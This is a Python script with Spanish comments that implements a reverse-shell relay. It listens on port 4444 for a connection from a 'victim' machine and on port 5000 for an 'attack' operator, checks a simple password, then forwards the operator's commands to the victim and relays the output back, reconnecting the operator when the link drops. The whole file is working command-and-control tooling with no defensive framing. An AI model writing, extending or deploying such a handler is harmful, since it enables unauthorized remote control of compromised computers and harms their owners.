import socket
import threading
import time
import argparse

# Función para manejar la comunicación entre dos sockets
def handle(attack_socket, victim_socket):
    """
    Maneja la comunicación entre dos clientes. Recibe datos del primer cliente
    y los reenvía al segundo cliente. Si la conexión se cierra, se reconecta.
    """
    try:
        timeout=1
        # Configurar timeout para victim_socket
        victim_socket.settimeout(1)  # Tiempo máximo de espera: 2 segundos

        # Enviar los datos recibidos al segundo cliente (client_socket2)
        failed = login(attack_socket, victim_socket)
        if failed == True:
            attack_socket = reconnect(attack_socket, victim_socket)

        while not stop_event.is_set():

            # Recibe datos del socket del cliente
            data = attack_socket.recv(1024)

            # Si no hay datos (cliente desconectado), salir del bucle
            if not data:
                print(f"\033[31mConexión cerrada desde el cliente\033[0m")
                attack_socket = reconnect(attack_socket, victim_socket)

            if not stop_event.is_set():
                victim_socket.send(data)

            try:
                # Intentar recibir datos del victim_socket con timeout
                data = victim_socket.recv(1024)
                if not data:
                    attack_socket.send(b'\033[31mConexion finalizada por la victima\033[0m')
                    print("\033[31mConexion finalizada por la victima\033[0m")
                    stop_event.set()
                else:
                    data = data + b'\033[34m\n$ \033[0m'
            except socket.timeout:
                data = b'\033[34m\n$ \033[0m'
                attack_socket.send(data)

                print("\033[34mTimeout: No se recibieron datos del cliente víctima en {} segundos.\033[0m".format(timeout))
                continue
            
            attack_socket.send(data)

    except Exception as e:
        print(f"\033[31mError en la comunicación: {e}\033[0m")
        #reconnect(attack_socket, victim_socket)

def login(attack_socket, victim_socket):
    data = b'\033[34mPassword: \033[0m'
    attack_socket.send(data)
    data = attack_socket.recv(1024)
    password = f"b'{PASS}\\n'"

    if str(data) != password:
        data = b'\033[31mPassword erronea\033[0m'
        stop_event.set()
        failed = True
    else:
        data = b'\033[34m$ \033[0m'
        failed = False
    attack_socket.send(data)
    
    return failed


# Función para configurar el servidor en el puerto de recepción
def receiver_port(host, port):
    """
    Configura el servidor para escuchar conexiones entrantes en el puerto de datos.
    """
    # Crear el socket del servidor
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Configurar opciones del socket (permitir reutilizar la dirección)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Enlazar el socket al puerto y dirección
    server.bind((host, port))

    # Escuchar conexiones entrantes (1 conexión a la vez)
    server.listen(1)
    print(f"\033[32mEscuchando en {host}:{port}...\033[0m")

    # Aceptar conexiones entrantes
    client_socket, client_address = server.accept()  # Aceptar conexión entrante
    print(f"\033[33mConexión establecida con {client_address}\033[0m")
    return client_socket

# Función para iniciar los hilos que manejarán la comunicación
def start_threads(attack_socket, victim_socket):
    """
    Inicia dos hilos: uno para manejar la comunicación de 'victim' y otro para 'attack'.
    """
    # Crear y empezar un hilo para manejar la comunicación con el 'victim'
    client_handler1 = threading.Thread(target=handle, args=(attack_socket, victim_socket))
    client_handler1.start()

# Función para reconectar los sockets cuando se cierra una conexión
def reconnect(attack_socket, victim_socket):
    """
    Reconecta el cliente 'shell' si su conexión se ha cerrado.
    Cierra las conexiones actuales y espera nuevas conexiones.
    """
    stop_event.clear()
    print("\033[34mReconectando... Cerrando conexiones y esperando nuevos clientes...\033[0m")
    # Cerrar la conexión existente de client_socket2 (shell)
    attack_socket.close()

    # Esperar 1 segundo para que el puerto se libere antes de aceptar nuevas conexiones
    time.sleep(1)

    # Aceptar una nueva conexión para el socket de la shell
    attack_socket = receiver_port(HOST2, PORT2)
    failed = login(attack_socket, victim_socket)
    if failed == True:
        attack_socket = reconnect(attack_socket, victim_socket)
        failed = False
    return attack_socket
    # Iniciar nuevos hilos para manejar la comunicación con los nuevos sockets
    #start_threads(attack_socket, victim_socket)

def parse_arguments():
    parser = argparse.ArgumentParser(description="Servidor que escucha en dos puertos.")

    # Argumentos para las direcciones IP y puertos
    parser.add_argument('--host', type=str, default='0.0.0.0', help='Dirección IP para el servidor para recibir la revshell (por defecto 0.0.0.0)')
    parser.add_argument('--host2', type=str, default='0.0.0.0', help='Dirección IP para el servidor por el que te conectas al cliente (por defecto 0.0.0.0)')
    parser.add_argument('--port', type=int, default=4444, help='Puerto para la conexión de datos (por defecto 4444)')
    parser.add_argument('--port2', type=int, default=5000, help='Puerto para la conexión de la shell (por defecto 5000)')
    parser.add_argument('-p', type=str, default=12345, help='Contraseña (por defecto 12345)')

    return parser.parse_args()

def main():
    global stop_event, PASS, HOST2, PORT2
    # Obtener los argumentos de la línea de comandos
    args = parse_arguments()

    # Usar los valores proporcionados en los argumentos
    HOST = args.host
    HOST2 = args.host2
    PORT = args.port
    PORT2 = args.port2
    PASS = args.p

    stop_event = threading.Event()

    # Crear los sockets para las conexiones entrantes de datos y de la shell
    victim_socket = receiver_port(HOST, PORT)
    attack_socket = receiver_port(HOST2, PORT2)

    # Iniciar los hilos para manejar la comunicación entre ambos clientes
    start_threads(attack_socket, victim_socket)

main()
